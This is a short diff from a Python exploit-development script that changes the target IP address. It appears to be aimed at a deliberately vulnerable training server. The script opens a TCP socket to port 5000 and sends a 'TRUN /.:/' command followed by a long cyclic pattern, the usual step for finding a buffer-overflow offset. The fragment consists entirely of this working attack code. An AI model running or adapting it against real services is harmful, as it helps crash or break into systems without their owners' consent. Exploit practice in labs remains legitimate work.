@@ -6,7 +6,7 @@ offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
 
 try:
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect(('192.168.1.1', 5000)) #CHANGE
+        s.connect(('127.0.0.2', 5000)) #CHANGE
         s.send(('TRUN /.:/' + offset))
         s.close()
 
